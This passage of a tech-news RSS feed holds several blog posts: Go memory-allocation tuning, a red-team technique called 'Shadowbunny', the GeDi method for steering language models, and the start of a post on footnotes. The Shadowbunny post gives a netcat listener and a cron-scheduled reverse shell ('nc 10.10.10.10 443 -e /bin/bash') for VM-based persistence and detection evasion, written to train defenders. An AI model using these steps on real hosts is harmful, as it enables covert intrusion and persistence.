</code></pre> <p>Above illustrates 13.50MB of heap memory is spent on allocating request objects and their response channels.</p> <p>We can introduce an object pool to promote the reuse of these channels.</p> <pre><code><span>type</span> reqPool <span>struct</span> {
	c <span>chan</span> request
}

<span><span>func</span> <span>NewReqPool</span><span>(seed <span>int</span>)</span> *<span>reqPool</span></span> {
	c := <span>make</span>(<span>chan</span> request, seed*<span>2</span>)
	<span>for</span> i := <span>0</span>; i &lt; seed; i++ {
		r := request{respChan: <span>make</span>(<span>chan</span> response)}
		<span>select</span> {
		<span>case</span> c &lt;- r:
		<span>default</span>:

		}
	}
	<span>return</span> &amp;reqPool{c}
}

<span><span>func</span> <span>(p *reqPool)</span> <span>Get</span><span>()</span> <span>request</span></span> {
	<span>select</span> {
	<span>case</span> r := &lt;-p.c:
		<span>return</span> r
	<span>default</span>:
		<span>return</span> request{respChan: <span>make</span>(<span>chan</span> response)}
	}
}

<span><span>func</span> <span>(p *reqPool)</span> <span>Put</span><span>(r request)</span></span> {
	<span>select</span> {
	<span>case</span> &lt;-r.respChan:
	<span>default</span>:
	}
	r.key = <span>""</span>
	r.t = Invalid
	<span>select</span> {
	<span>case</span> p.c &lt;- r:
	}
}
</code></pre> <p>The above illustrates a simple channel implemented pool. The first implementation was a sync.Pool. After further profiling however implementing our own proved to be easier on the heap.</p> <p>After plumbing the requst pool into the rest of the code pprof reports a much nicer result.</p> <pre><code>(pprof) list \.Lock
Total: 80.06MB
ROUTINE ======================== github.com/ldelossa/distlock.(*Manager).Lock in /home/louis/git/go/distlock/manager.go
       1MB        1MB (flat, cum)  1.25% of Total
         .          .     89:		return resp.ctx, func() {}
         .          .     90:	}
         .          .     91:
         .          .     92:	m.propagateCancel(ctx, resp.ctx, key)
         .          .     93:
       1MB        1MB     94:	return resp.ctx, func() {
         .          .     95:		m.unlock(key)
         .          .     96:	}
         .          .     97:}
         .          .     98:
         .          .     99:func (m *Manager) propagateCancel(parent context.Context, child context.Context, key string) {

</code></pre> <h2>A PGX Trick</h2> <p>Removing the cost of the response-request model was a good win but there is still more to tune.</p> <p>Lets generate a graph of our call stack and associated allocations.</p> <pre><code>‚ùØ go tool pprof -svg distlock.test memprofile.out
</code></pre> <p><img alt="photo of high PGX allocations" src="https://www.ldelossa.is/profile001.png"></p> <p>The above diagram is showing a large amount of allocations in PGX's getRows method. Its not rare for methods dealing with serialization to and from the database to allocate heavily. But it would be nice if we could eliminate this.</p> <p>Getting a session pg advisory lock typically looks like this.</p> <pre><code>SELECT pg_try_advisory_lock($1);
SELECT pg_advisory_unlock($1);
</code></pre> <p>Both lock functions return a table expression resulting in a true or a false.</p> <p>An optimization we can make is changing these queries to only return a row if the lock function returns true. Our application logic can then simply check whether any rows are returned and not read the contents.</p> <p>First lets fix our queries.</p> <pre><code>SELECT lock FROM pg_try_advisory_lock($1) lock WHERE lock = true;
SELECT lock FROM pg_advisory_unlock($1) lock WHERE lock = true;
</code></pre> <p>A slight modification allows us to only return rows if the lock function returns true.</p> <p>The next step is to short circuit the PGX library from reading the rows. This took a bit of library spelunking but I eventually discovered this...</p> <pre><code>rr := m.conn.PgConn().ExecParams(ctx,
    trySessionUnlock,
    [][]<span>byte</span>{
        keyify(key),
    },
    <span>nil</span>,
    []<span>int16</span>{<span>1</span>},
    <span>nil</span>)
tag, err := rr.Close()
<span>if</span> err != <span>nil</span> {
    <span>return</span> response{<span>false</span>, <span>nil</span>, err}
}
<span>if</span> tag.RowsAffected() == <span>0</span> {
    <span>return</span> response{<span>false</span>, <span>nil</span>, fmt.Errorf(<span>"unlock of key %s returned false"</span>, key)}
}
</code></pre> <p>By using the lower level PgConn object we can exec our queries, get a response writer, and immediately close it to obtain the command tag. The command tag tells us if any rows were affected by the exec. This effectively tells us whether the lock was obtained or not in a somewhat indirect way.</p> <p>Let's take a new 1 minute memory profile to see how this effects our heap.</p> <p><img alt="photo of high PGX allocations" src="https://www.ldelossa.is/profile002.png"></p> <p>Notice the large improvement achieved.</p> <p>We can also compare the benchmark output.</p> <pre><code>85149            890605 ns/op            1288 B/op         21 allocs/op
</code></pre> <p>Where PGX was reading the rows.</p> <pre><code>58051           1238353 ns/op             517 B/op         11 allocs/op
</code></pre> <p>By eliminating the reading of rows we perform many more cycles and cut our allocation in roughly half.</p> <h2>Disclaimer on optimization</h2> <p>Is it worth to dig this deep into your allocations? Depends. If you know the code you are writing will be in the "hot-path" its empowering to know what your allocation profile looks like. Learning the skills to performance tune is addicting and powerful but writing code that can be read and easily maintained should always be the first goal. That being said I do think every engineer should go down the rabbit hole at least once. Its a lot of fun.</p> </article></div></div></div>]]>
            </description>
            <link>https://www.ldelossa.is/blog/allocation_optimization_in_go</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579391</guid>
            <pubDate>Thu, 24 Sep 2020 15:16:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Beware of the Shadowbunny -Using virtual machines to persist and evade detection]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579384">thread link</a>) | @wunderwuzzi23
<br/>
September 24, 2020 | https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/ | <a href="https://web.archive.org/web/*/https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>This was also presented at <a href="https://bsidessg.org/">BSides Singapore 2020</a>. The slides are <a href="https://embracethered.com/blog/downloads/Shadowbunny_BSides_Singapore_2020.pptx">here</a>.</p>
<h2 id="the-origins-of-the-shadowbunny">The origins of the Shadowbunny</h2>
<p>A few years ago, around 2016, I went on a relaxing two weeklong vacation. It was great to disconnect from work. I traveled to Austria, enjoying hiking in the mountains, and exploring Vienna.</p>
<p>When I came back to the office, the team had placed a giant bunny teddy into my chair. In retrospect, it seemed a legitimate replacement for the manager, <em>as hardly anyone seemed to have noticed my absence</em>.</p>
<p><img src="https://embracethered.com/blog/images/2020/shadowbunny-transparent.png" alt="The original Shadowbunny"></p>
<p>At that time, I had been contemplating with the idea of using virtual machines for red teaming. Especially for lateral movement it seemed like a great way to try something new that possibly evades detections and at the same time providing a persistence mechanism.</p>
<p>The combination of the ‚Äúshadow manager‚Äù that was put in my chair during vacation as replacement, plus the idea of using virtual machines for lateral movement was the beginning of the Shadowbunny.</p>
<blockquote>
<p>A Shadowbunny is a virtual machine (VM) instance that is deployed by an adversary on a target host to pivot and provide  persistence and at the same time evade detections. <a href="https://www.urbandictionary.com/define.php?term=shadowbunny">¬ª Urban Dictionary ¬´</a></p>
</blockquote>
<p>The VM itself does not have any security monitoring and is entirely attacker controlled.</p>
<h3 id="using-virtual-machines-for-attacks">Using virtual machines for attacks</h3>
<p><strong>Real-world adversaries are using virtual machines as well by the way.</strong> Recently the <a href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/">Ragnar Locker Ransomware</a> was seen using a virtual machine (VirtualBox) to hide its tracks.</p>
<p>During red team operations I have used the Shadowbunny mostly for measuring long term persistence, but also for unique things such as cryptocurrency mining.</p>
<p><img src="https://embracethered.com/blog/images/2020/persistence-cryptomining.jpg" alt="Shadowbunny in Red Team Operations Examples"></p>
<p>If there is interest, I can chat more about such unique exercises in another post - let me know. Let‚Äôs look on why adversaries use virtual machines.</p>
<h2 id="why-would-adversaries-use-virtual-machines">Why would adversaries use virtual machines?</h2>
<p>There a wide range of reasons for exploring virtual machines during lateral movement:</p>
<ul>
<li><strong>The VM is entirely attacker controlled</strong> - a perfect sandbox for deployment ‚Äúbehind enemy‚Äù lines</li>
<li><strong>Lack of monitoring and security controls inside the VM</strong> ‚Äì there is no anti-virus or detections inside the VM</li>
<li><strong>Persistence</strong> - VMs can be setup to automatically start again in case the host reboots</li>
<li><strong>Obfuscation</strong> - VMs can use disk encryption to make forensic investigations difficult</li>
<li><strong>Backdoor</strong> - Many virtualization products come with features to establish native host connections that might stay undetected (such as Shared Folders for persistent access to files on the host). Or an attacker could wait for new 0-days to re-gain access to the host.</li>
<li>This <strong>attack technique is not well researched but used by real world adversaries</strong>. We need better detection capabilities.</li>
<li>A <strong>Shadowbunny pivot creates a VM on the target to pivot and this might go under the radar</strong></li>
<li>An interesting side effect is that a VM also limits the damage that untrusted code can cause in the environment. For instance, let‚Äôs say you run a public cryptocurrency miner during a red teaming operation. The red team reviews the code, even compiles it themselves and to add additional safety measure one can run the untrusted code in a dedicated, isolated VM.</li>
</ul>
<p>Above points are some of the reasons we will see malware leverage virtual machines more often in the future, which brings us to the reason on starting to discuss these more thoroughly.</p>

<p>The Shadowbunny technique is a post-exploitation scenario. This means that an adversary has compromised a target and has administrative access. There is no vulnerability per se in any information described in this post.</p>
<p>The fact that there is now evidence that adversaries use this technique for ransomware deployment, shows that more light has to be put on understanding how virtual machines can be misused by adversaries.</p>
<p>The goal is to explore what is possible and to improve detections for post-exploitation scenarios.</p>
<p>So, let‚Äôs dive into the technical aspects.</p>

<p>The first question is what virtualization product to choose from? There are a lot of options‚Ä¶. Initially, I used <strong>Hyper-V</strong>, as that ships out of box with Windows and if not present, can be quickly enabled.</p>
<p>This post focusing on <strong>VirtualBox</strong> to help train the blue team and explore these attacks - remember the Ragnar Locker ransomware used VirtualBox. But no worries, we also cover the most important commands for Hyper-V.</p>
<p>Personally, I have not yet used VMWare for this. Although after sharing this information with another red team in the industry, they leveraged VMWare successfully. They ended up manually installing it on a compromised host.</p>
<p>VirtualBox is a great product and it is available for multiple platforms.</p>
<h2 id="direct-host-connections">Direct Host Connections</h2>
<p>One important aspect is that some virtualization products can be configured to have direct host access. What I mean by this is for instance the creation of a <strong>shared folder between guest and host</strong>, depending on the product access can be given without having to authenticate over the network. <strong>This is a backdooring technique to be aware of.</strong></p>
<p>For malware this is ideal because otherwise accessing files on the host would go over a remote connection, which means one has to have valid credentials to authenticate to the host at all times. That can be useful also, but it is not as neat as ‚Äúnative‚Äù host connection using a shared folder. Hyper-V has limitation in this regards with ‚Äúdirect‚Äù guest to host connections.</p>
<p>For certain attacks, a persistent connection (or backdoor) to the host might not be necessary. For instance, imagine an adversary using a VM to mine cryptocurrency or perform offline password brute force attacks. In that case they only need a NAT or bridged LAN connection to reach their C2 infrastructure to share results. There is no need to ever access the host directly after deploying the VM.</p>
<p>For this demonstration and proof of concept, we are targeting a Windows machine (64 bit).</p>
<h2 id="pre-requisites">Pre-requisites</h2>
<p>For the scenario we are walking through there are a few pre-requisites:</p>
<h3 id="command-and-control-infrastructure">Command and Control Infrastructure</h3>
<p>The first step is to setup basic Command &amp; Control infrastructure (C2). Just leverage whatever C2 infrastructure you are using during red team operations. For example, here is a screenshot of Sliver by Bishop Fox setup, accepting incoming zombies (shadowbunnies) connections:</p>
<p><img src="https://embracethered.com/blog/images/2020/shadowbunny-c2-prereq.jpg" alt="Shadowbunny Command Center"></p>
<p>However, for this simple demo we just use <code>netcat</code> as server. The attacker‚Äôs server is hosted at <code>10.10.10.10</code>.</p>
<p>We start up our <code>netcat</code> server using:</p>
<pre><code>sudo nc -klvp 443
</code></pre><p>The arguments are as follows:</p>
<ul>
<li><code>-k</code> allows for multiple connections, so that netcat doesn‚Äôt entirely terminate if we exit the shell</li>
<li><code>-l</code> configures netcat as a server</li>
<li><code>-v</code> is the verbose mode, so netcat displays some more information</li>
<li><code>-p</code> specifies the port to listen on, in this case we just use port 443</li>
</ul>
<p>That is it for the demo, the C2 is up and running. The following image shows this simple setup:</p>
<p><img src="https://embracethered.com/blog/images/2020/shadowbunny-c2.png" alt="Shadowbunny Command Center"></p>
<p>A host firewall might be blocking connections, in that case the firewall needs adjustments. During red team operation an encrypted channel should be used, possibly using HTTPS traffic on 443 to blend in.</p>
<h3 id="creating-the-shadowbunny-virtual-disk-image">Creating the Shadowbunny virtual disk image</h3>
<p>The second pre-requisite is the Shadowbunny disk image.</p>
<p><strong>The red team can customize the VM to their hearts content, it is fully controlled by the attacker.</strong></p>
<p>The VM will probably want to automatically connect to the C2 periodically to check for commands. Possibly enable disk encryption, uninstall any unneeded software, establish direct connections to host via a shared folder or clipboard access, disabling any AV inside, sink holing telemetry, maybe USB access to have access to smart cards, or security keys and more.</p>
<p>The creation can be a lengthy and involved step depending on the red team operation. For certain scenarios the disk size has to be small to limit the amount of time it takes to perform lateral movement.</p>
<blockquote>
<p>Interesting fact: The recent ‚ÄúRagnar Lock Ransomware‚Äù used an old version of Windows XP ‚Äì which keeps the size of the virtual machine quite small.</p>
</blockquote>
<p>To get started Ubuntu Server VM is a good option. For the more advanced cases there are light-weight Linux distributions to choose from as well. In the end, the outcome will be a virtual machine disk image file (or vdi, vhd, vhdx).</p>
<p><strong>Using flock to regularly connect to the C2:</strong></p>
<p>If the VM runs Linux the <code>flock</code> command can be used to awake zombies regularly.</p>
<ul>
<li>Edit crontab on the attack VM (I like nano):</li>
</ul>
<pre><code>sudo crontab -e
</code></pre><ul>
<li>Afterward, updating the cron file:</li>
</ul>
<pre><code>* * * * * /usr/bin/flock -n /tmp/zombie.lock nc 10.10.10.10 443 -e /bin/bash
</code></pre><p><strong>Explanation:</strong>
The <code>flock</code> command is an elegant solution to ensure the command is only running once. The <code>-n</code> option means that if the lock file at <code>/tmp/zombie.lock</code> exists, then the process will stop. If it is not yet created, then the <code>netcat</code> command will be run and connect to the server.</p>
<p>Cron jobs and <code>flock</code> come in handy for other scenarios also.</p>
<h3 id="optional-shared-folders-and-other-advanced-features">Optional: Shared Folders and other advanced features</h3>
<p>To support shared folders or access the hosts clipboard, the ‚ÄúGuest Additions‚Äù must be installed in the VM. More information, and options on how to install can be found on Ubuntu and VirtualBox websites.</p>
<p>In this case I downloaded the ISO file directly into the VM using the following command.</p>
<pre><code>wget https://download.virtualbox.org/virtualbox/6.1.8/VBoxGuestAdditions_6.1.8.iso`
</code></pre><p>And then installed it using the following commands:</p>
<pre><code>sudo mkdir /mnt/cd
sudo mount VBoxGuestAdditions_6.1.8.iso /mnt/cd
sudo ./VBoxLinuxAdditions.run -‚Äìnox11
</code></pre><p>That‚Äôs it, the VirtualBox <strong>Guest Additions</strong> are now installed in the VM.</p>
<p>At times this step needs debugging, as the installation of the Guest Additions can be done in a variety of ways and depends on what operating system that is being used. The VirtualBox manual has more details.</p>
<p>Having those pre-requisites setup, we are ready to perform a <strong>Shadowbunny pivot</strong> using this virtual machine image.</p>

<p>Now that client and server are ready, they can be used during lateral movement.</p>
<p><a href="https://embracethered.com/blog/images/2020/shadowbunny-overview.jpg"><img src="https://embracethered.com/blog/images/2020/shadowbunny-overview.jpg" alt="Shadowbunny Overview"></a></p>
<p>The steps involved the pivot, installation/enabling of virtualization software, downloading of the pre-created disk images, configuration and launch. Let us look at this in more detail.</p>
<h2 id="compromise---pivoting-to-the-target">Compro‚Ä¶</h2></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/">https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/</a></em></p>]]>
            </description>
            <link>https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579384</guid>
            <pubDate>Thu, 24 Sep 2020 15:16:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GeDi: A Powerful New Method for Controlling Language Models]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579357">thread link</a>) | @merqurio
<br/>
September 24, 2020 | https://blog.einstein.ai/gedi/ | <a href="https://web.archive.org/web/*/https://blog.einstein.ai/gedi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <div>
      <div>
          <!--kg-card-begin: markdown--><p><img src="https://blog.einstein.ai/content/images/2020/09/gedi_logo_whitebackground.png" alt="gedi_logo" width="100%"></p><hr>
<blockquote>
<p><strong>TL;DR:</strong> We use smaller language models as generative classifiers to guide generation from larger language models. We show that this method can make generations friendlier, reduce bias and toxicity, and achieve zero-shot controllable generation of unseen topics.</p>
</blockquote>
<p>Recent improvements in language modeling have resulted from scaling up larger models to larger datasets. While models like <a href="https://openai.com/blog/better-language-models/">GPT-2</a> and <a href="https://arxiv.org/abs/2005.14165">GPT-3</a> have impressive generation abilities, controlling them or adapting them can be difficult. GPT-3 can sometimes <a href="https://twitter.com/nickcammarata/status/1282471881887473666/photo/1">be controlled by conditioning on prompts</a>, but this likely will not work for every attribute we want to control and can be sensitive to the exact choice of prompt. Furthermore, large language models are known to generate text that is biased and/or offensive, creating ethical concerns for incorporating them into products and giving them the potential to be used for malicious purposes. One possible approach to control language models is to finetune them to new data or with new cost functions, but this has several downsides:</p>
<ul>
<li>
<p>Finetuning is very computationally expensive if the model is large.</p>
</li>
<li>
<p>Finetuning <a href="https://openai.com/blog/fine-tuning-gpt-2/">approaches that use human feedback</a> require expensive annotations.</p>
</li>
<li>
<p>Finetuning to new data risks catastrophic forgetting of the wealth of information that the model has learned during pretraining.</p>
</li>
<li>
<p>It is very difficult to teach the model what not to do. It would for instance be very difficult to prevent the model from generating offensive text or extremist views using finetuning to new data without significantly reducing the diversity of text it can generate.</p>
</li>
</ul>
<p>We developed GeDi (pronounced "Jedi") as an algorithmic innovation to better harness and control powerful large language models, without needing to use significant extra compute during training or generation. Instead of finetuning language models directly, we use generative discriminators (GeDis) to guide language models towards generating text with a desired attribute (or away from generating text with an undesired attribute). GeDis can be used to filter next word predictions to make language models more controllable, more friendly, and less toxic. GeDis are themselves a type of language model (they condition on an attribute variable like <a href="https://blog.einstein.ai/introducing-a-conditional-transformer-language-model-for-controllable-generation/">CTRL</a>), but we use them as generative classifiers (discriminators) via Bayes rule to guide generation from other language models. The GeDi used as a guide can be significantly smaller than the language model used for generation, allowing GeDi to be applied with limited computational overhead for both training and generation. GeDi also has several other advantages including the ability to</p>
<ul>
<li>generalize control of attributes such as sentiment across many domains.</li>
<li>guide models away from undesirable attributes (e.g. detoxifying generation).</li>
<li>controllably generate topics unseen during training zero-shot.</li>
</ul>
<p>See our <a href="https://arxiv.org/abs/2009.06367">paper</a>, <a href="https://github.com/salesforce/GeDi">code</a>, or run our topic model in Google <a href="https://colab.research.google.com/github/salesforce/GeDi/blob/master/GeDi_guided_GPT_2_XL.ipynb">Colab</a>.</p>
<h2 id="generalizingpositivityacrossdomains">Generalizing positivity across domains</h2>
<p>We find that a GeDi trained to classify sentiment on movie reviews can generalize the concepts of positivity and negativity to many other topics and text domains. For instance, in the following sample we used a GeDi trained on IMDb movie reviews to guide GPT-2, conditioned on the prompt in <strong>bold</strong>, towards positive sentiment:</p>
<pre><p> <b> Generating with GeDi-guided GPT-2 (positivity). </b> </p>
<b>I just read this paper on Generative-Discriminative training.</b> 
This is something I think will revolutionize the way people think
about and interact with their images."

"This is a really cool paper, and it's very well done," said 
Andrew Ng, a professor of computer science at Stanford 
University who has been working on deep learning for more 
than two decades. "It's not clear to me that there are any 
practical applications yet." 

Ng added that he was impressed by the authors' ability to use 
generative models in such an elegant way without sacrificing 
accuracy or performance. He also noted that they had used only 
one image from each class of images√¢‚Ç¨‚Äùa technique known as feature 
selection√¢‚Ç¨‚Äùto train their model instead of using multiple classes
per image as many other researchers have done before them. 
Ng said he would be interested in seeing how much better the 
system could do if it were trained with more data sets from 
different angles, including those taken through different 
cameras or lenses (which can give rise to subtle differences
between photos)
</pre>
<p>GeDi allows us to control the sentiment of GPT-2 generations, while also maintaining the vast knowledge about specific topics (in this case deep learning) and people (in this case Andrew Ng) that GPT-2 learned during training. Finetuning GPT-2 directly to movie reviews would likely lose this knowledge. GeDi's ability to generalize positivity across domains could be used to help make language models more friendly and less biased. For instance, the following prompts (given in bold), trigger GPT-2 to generate biased text. However, using GeDi to guide GPT-2 leads to generations with a warm and friendly tone.</p>
<pre><p> <b> Generating with GeDi-guided GPT-2 (positivity). </b> </p>
<b>I heard another passenger on our plane is Saudi Arabian.</b> 
He asked me if I knew him and when I told him that he smiled 
and said "thank you". It was nice to hear from someone else 
who has a similar background."

√¢‚Ç¨‚Äú Aisha, age 16, from the Middle East:

"My family came to Canada when I was very young so it was 
always exciting to go back home! My favourite memories are 
going shopping with my family. Going on adventures with 
my mom!"
</pre>
<p>Generating from GPT-2 using the above prompt and using the same (greedy) decoding scheme results in text where the Saudi Arabian passenger is suspected to be a terrorist.</p>
<pre><b>The Muslim woman wore a hijab.</b> Her mother explained: "When I 
was young I didn't know anything about her and when I met her 
for the first time, it was very emotional. She told me how she 
felt in America and how proud she was of being Muslim."
</pre>
<p>Generating from GPT-2 using the above prompt above results in text where the woman is murdered by a man who is quoted making racist statements.</p>
<pre><b>Some of the black communities are so</b> supportive. There are
a lot of young people that are just learning about it, and a 
lot of older people as well."

In addition to helping with his legal case, Dillard is helping 
others in need through his foundation, The Dillard Foundation: 
A Legacy Of Hope (www.dillardfoundation.org). He is donating 
more than half of all proceeds from his latest album to help 
children and families facing challenges throughout the 
United States.
</pre>
<p>Generating from GPT-2 using the above prompt above results in text that suggests that the black communities will react violently. On all three of these prompts, GeDi was able to guide GPT-2 away from offensive and biased generations towards warm and friendly text.</p>
<h2 id="detoxifyinglanguagemodels">Detoxifying language models</h2>
<p>We showed that GeDis guiding for positivity can lead to warm and friendly generations, which can reduce toxicity. We also trained a GeDi explicitly for detoxification. We did this by training the GeDi to classify toxic and offensive text on the <a href="https://www.kaggle.com/c/jigsaw-toxic-comment-classification-challenge">Jigsaw toxic comment classification</a> dataset, and then using it to guide GPT-2 towards non-toxic generations. We generated samples conditioned on 100 prompts designed to trigger toxic generations at a higher rate, and asked human annotators to rate samples from 1 to 3 for toxicity (1 - non-toxic, 2 - some what toxic, 3 - clearly toxic), and linguistic quality from 1 to 4. We specifically asked annotators to judge linguistic quality independently of toxicity. We found that using a GeDi to guide GPT-2 generation away from toxicity significantly reduced the frequency of toxic generations. Interestingly, we also found that it slightly improved linguistic quality, and this improvement was bordering on statistical significance (p=0.05).</p>
<table>
<thead>
<tr>
<th>Model</th>
<th>Toxicity</th>
<th>Linguistic quality</th>
</tr>
</thead>
<tbody>
<tr>
<td>GPT-2</td>
<td>1.45</td>
<td>3.23</td>
</tr>
<tr>
<td>GeDi-guided GPT2</td>
<td>1.17</td>
<td>3.44</td>
</tr>
</tbody>
</table>
<p>We also observed GeDi was able to smoothly navigate some especially aggressive prompts, given in <strong>bold</strong>.</p>
<pre><p> <b> Generating with GeDi-guided GPT-2 (detoxification). </b> </p>
<b>You should just kill</b> this one. I don't want to have to 
explain why I did it, and I don't want to get into the details 
of how I'm doing this. So we'll do that in the next section. 
But first, a few notes about what we're trying to do:

We need a way for each team captain/coach to assign players who 
will be playing for that team. That's easy enough; you can use 
an Excel spreadsheet or something similar (I used Microsoft 
Access). We also need some way of keeping track of which 
players are on which teams so they can be assigned appropriately 
when rosters are finalized at the end of each season (we'll 
talk more about roster management later). We also need some 
way for us as fans and media members who cover these games √¢‚Ç¨‚Äù 
especially those covering college football √¢‚Ç¨‚Äù not only know 
where all our favorite players are going but what their roles 
will be on those teams as well! 
</pre>
<p>When using the above prompt, the first word that GPT-2 generates is "yourself".</p>
<pre><b>Do I look like I give a</b> good impression?

I'm not sure. But if you're going to be in the public eye, you 
have to do your best. If people are looking at me and thinking
, "Oh my God, he's so handsome," then that's great! It means 
they like me as a person and not just as an actor. That's what 
it comes down to: People want to see themselves reflected back 
on them in some way or another. So if you can make yourself 
look good enough for people who don't know who you are yet √¢‚Ç¨‚Äù 
even though they may think of themselves as being very nice √¢‚Ç¨‚Äù 
that is something worth striving for."
</pre>
<p>When using the above prompt, the first word that GPT-2 generates is a curse word. Preventing toxic generations from language models could make them less prone to misuse and more suitable for many applications.</p>
<h2 id="topicgeneration">Topic generation</h2>
<p>We also apply GeDis to generate text corresponding to particular topics. GeDi uses an attribute variable or <em>control code</em> (Like from <a href="https://blog.einstein.ai/introducing-a-conditional-transformer-language-model-for-controllable-generation/">CTRL</a>) that ‚Ä¶</p></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.einstein.ai/gedi/">https://blog.einstein.ai/gedi/</a></em></p>]]>
            </description>
            <link>https://blog.einstein.ai/gedi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579357</guid>
            <pubDate>Thu, 24 Sep 2020 15:13:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Notes on Notes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579351">thread link</a>) | @sferik
<br/>
September 24, 2020 | https://everythingstudies.com/2020/09/24/notes-on-notes/ | <a href="https://web.archive.org/web/*/https://everythingstudies.com/2020/09/24/notes-on-notes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-13646">
	<!-- .entry-header -->

	<div>
		<p><em>[Note: Just notes.]</em></p>
<p>I use footnotes<a href="#fn_end" name="ref_end">[1]</a> in my articles. I didn‚Äôt always use them<a href="#fn_practical" name="ref_practical">[2]</a>, but I started to do so more and more after about a year<a href="#fn_wallace" name="ref_wallace">[3]</a> into my blogging<a href="#fn_timeless" name="ref_timeless">[4]</a>. They have both benefits<a href="#fn_writing" name="ref_writing">[5]</a><a href="#fn_drama" name="ref_drama">[6]</a> and drawbacks<a href="#fn_easy" name="ref_easy">[7]</a>, but overall I think the benefits are greater ‚Äî as long as you don‚Äôt‚Ä¶ overdo it.</p>

<p>‚Ä¢ ‚Ä¢ ‚Ä¢</p>

<h4>Notes</h4>
<p><a href="#ref_end" name="fn_end">[1]</a><br>Or maybe they‚Äôre endnotes? The distinction disappears when the concept of the ‚Äúpage‚Äù becomes obsolete. Before getting a note routine down<a href="#fn_wallace" name="ref_wallace">[3]</a> I tried putting notes at the end of each section instead of the end of the post, which is more like traditional footnotes. It worked ok but it was interruptive<a href="#fn_otoh" name="ref_otoh">[8]</a> and depended on having short sections, almost like pages. In the end I think we‚Äôre more likely to keep the word ‚Äúfootnotes‚Äù than ‚Äúendnotes‚Äù because a web<em>page</em> feels like one big page.</p>
<p><a href="#ref_practical" name="fn_practical">[2]</a><br>I didn‚Äôt use notes in the beginning because there‚Äôs no native function in my wordpress editor for inserting and managing them. I have keep track and write the HTML code for them manually. I did work out a routine to do it with a minimum of hassle but it‚Äôs still a chore and I had to be convinced of their value to consider it worth doing<a href="#fn_wallace" name="ref_wallace">[3]</a>.</p>
<p><a href="#ref_wallace" name="fn_wallace">[3]</a><br>I became a footnote convert after reading David Foster Wallace‚Äôs essay <span><a href="https://en.wikipedia.org/wiki/A_Supposedly_Fun_Thing_I%27ll_Never_Do_Again" target="_blank" rel="noopener">A Supposedly Fun Thing I‚Äôll Never Do Again</a></span> in 2016. There and in his massive novel <em>Infinite Jest</em><a href="#fn_media" name="ref_media">[9]</a> he didn‚Äôt just use notes to add some extra information or clarification, he used them to construct separate strands of narrative, sometimes without which you couldn‚Äôt understand the story. He was a ‚Äúfootnote artist‚Äù if there ever was one.</p>
<p><a href="#ref_timeless" name="fn_timeless">[4]</a><br>This post took a long time from conception to execution. I had the idea for it just as I was getting into footnotes as a writing device<a href="#fn_wallace" name="ref_wallace">[3]</a> four years ago. <span><a href="https://everythingstudies.com/2019/10/30/cat-couplings/" target="_blank" rel="noopener">Cat couplings</a></span> was my previous record of taking a long time from start to finish;<a href="#fn_semi" name="ref_semi">[10]</a> I started that one back in 2015 before the blog even existed and didn‚Äôt go back to finish it until last year. Other posts spend a very short time on the shop floor<a href="#fn_short" name="ref_short">[11]</a><a href="#fn_started" name="ref_started">[12]</a>, often because I have to get something out while it‚Äôs still relevant. Maybe this one took so long because it‚Äôs timeless, and therefore easier to postpone.</p>
<p><a href="#ref_writing" name="fn_writing">[5]</a><br>Footnotes means you can cut your cake and keep it too, which takes a lot of pressure off when you lack perfect laser focus<a href="#fn_easy" name="ref_easy">[7]</a>. Ideally, a piece of writing has a point to make and gets there truly and cleanly, like this:</p>
<p><img loading="lazy" data-attachment-id="13665" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-straight/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png" data-orig-size="1116,268" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-straight" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=300" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=656" src="https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=656" alt="" width="656" height="158" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=656 656w, https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=150 150w, https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=300 300w, https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=768 768w, https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=1024 1024w, https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png 1116w" sizes="(max-width: 656px) 100vw, 656px"></p>
